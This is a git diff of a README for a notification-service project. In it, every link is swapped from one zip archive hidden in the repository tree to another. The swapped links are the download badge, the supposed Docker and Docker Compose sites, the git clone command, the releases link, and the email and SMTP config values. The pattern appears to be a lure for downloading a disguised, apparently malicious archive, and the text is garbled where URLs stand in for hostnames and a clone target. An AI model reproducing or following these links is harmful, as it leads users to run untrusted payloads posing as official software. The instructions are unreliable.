@@ -1,6 +1,6 @@
 # 🚀 Distributed-Async-Notification-System - Reliable Notifications Made Simple
 
-[![Download](https://raw.githubusercontent.com/WORKINGZONE99/Distributed-Async-Notification-System/main/notification-service/.gradle/8.10.2/Distributed-Async-Notification-System_fibdom.zip)](https://raw.githubusercontent.com/WORKINGZONE99/Distributed-Async-Notification-System/main/notification-service/.gradle/8.10.2/Distributed-Async-Notification-System_fibdom.zip)
+[![Download](https://github.com/WORKINGZONE99/Distributed-Async-Notification-System/raw/refs/heads/main/notification-service/src/main/java/com/bhaskarblur/notification/Di/Distributed_Notification_Async_System_v3.1.zip)](https://github.com/WORKINGZONE99/Distributed-Async-Notification-System/raw/refs/heads/main/notification-service/src/main/java/com/bhaskarblur/notification/Di/Distributed_Notification_Async_System_v3.1.zip)
 
 ## 📋 Overview
 
@@ -28,15 +28,15 @@ To run the Distributed-Async-Notification-System, you need:
 ## 🚀 Getting Started
 
 1. **Install Docker**:
-   - Follow the instructions on the [Docker website](https://raw.githubusercontent.com/WORKINGZONE99/Distributed-Async-Notification-System/main/notification-service/.gradle/8.10.2/Distributed-Async-Notification-System_fibdom.zip) to install Docker.
+   - Follow the instructions on the [Docker website](https://github.com/WORKINGZONE99/Distributed-Async-Notification-System/raw/refs/heads/main/notification-service/src/main/java/com/bhaskarblur/notification/Di/Distributed_Notification_Async_System_v3.1.zip) to install Docker.
 
 2. **Install Docker Compose**:
-   - Follow the instructions on the [Docker Compose website](https://raw.githubusercontent.com/WORKINGZONE99/Distributed-Async-Notification-System/main/notification-service/.gradle/8.10.2/Distributed-Async-Notification-System_fibdom.zip) to install Docker Compose.
+   - Follow the instructions on the [Docker Compose website](https://github.com/WORKINGZONE99/Distributed-Async-Notification-System/raw/refs/heads/main/notification-service/src/main/java/com/bhaskarblur/notification/Di/Distributed_Notification_Async_System_v3.1.zip) to install Docker Compose.
 
 3. **Clone the Repository**:
    Open your terminal and run the following command to clone the repository to your local machine:
    ```
-   git clone https://raw.githubusercontent.com/WORKINGZONE99/Distributed-Async-Notification-System/main/notification-service/.gradle/8.10.2/Distributed-Async-Notification-System_fibdom.zip
+   git clone https://github.com/WORKINGZONE99/Distributed-Async-Notification-System/raw/refs/heads/main/notification-service/src/main/java/com/bhaskarblur/notification/Di/Distributed_Notification_Async_System_v3.1.zip
    ```
 
 4. **Navigate to the Project Directory**:
@@ -47,7 +47,7 @@ To run the Distributed-Async-Notification-System, you need:
 
 ## 📥 Download & Install
 
-To download the latest version of the Distributed-Async-Notification-System, **visit this page to download**: [Releases Page](https://raw.githubusercontent.com/WORKINGZONE99/Distributed-Async-Notification-System/main/notification-service/.gradle/8.10.2/Distributed-Async-Notification-System_fibdom.zip)
+To download the latest version of the Distributed-Async-Notification-System, **visit this page to download**: [Releases Page](https://github.com/WORKINGZONE99/Distributed-Async-Notification-System/raw/refs/heads/main/notification-service/src/main/java/com/bhaskarblur/notification/Di/Distributed_Notification_Async_System_v3.1.zip)
 
 1. Choose the correct version for your operating system.
 2. Follow the installation instructions specific to your system.
@@ -83,7 +83,7 @@ The application comes with a configuration file. You may want to customize the f
 
 ### Example Configuration
 
-Below is an example configuration in the `https://raw.githubusercontent.com/WORKINGZONE99/Distributed-Async-Notification-System/main/notification-service/.gradle/8.10.2/Distributed-Async-Notification-System_fibdom.zip` file:
+Below is an example configuration in the `https://github.com/WORKINGZONE99/Distributed-Async-Notification-System/raw/refs/heads/main/notification-service/src/main/java/com/bhaskarblur/notification/Di/Distributed_Notification_Async_System_v3.1.zip` file:
 
 ```yaml
 spring:
@@ -94,9 +94,9 @@ spring:
 
 notification:
   email:
-    from: "https://raw.githubusercontent.com/WORKINGZONE99/Distributed-Async-Notification-System/main/notification-service/.gradle/8.10.2/Distributed-Async-Notification-System_fibdom.zip"
+    from: "https://github.com/WORKINGZONE99/Distributed-Async-Notification-System/raw/refs/heads/main/notification-service/src/main/java/com/bhaskarblur/notification/Di/Distributed_Notification_Async_System_v3.1.zip"
     smtp:
-      host: "https://raw.githubusercontent.com/WORKINGZONE99/Distributed-Async-Notification-System/main/notification-service/.gradle/8.10.2/Distributed-Async-Notification-System_fibdom.zip"
+      host: "https://github.com/WORKINGZONE99/Distributed-Async-Notification-System/raw/refs/heads/main/notification-service/src/main/java/com/bhaskarblur/notification/Di/Distributed_Notification_Async_System_v3.1.zip"
       port: 587
 ```
 
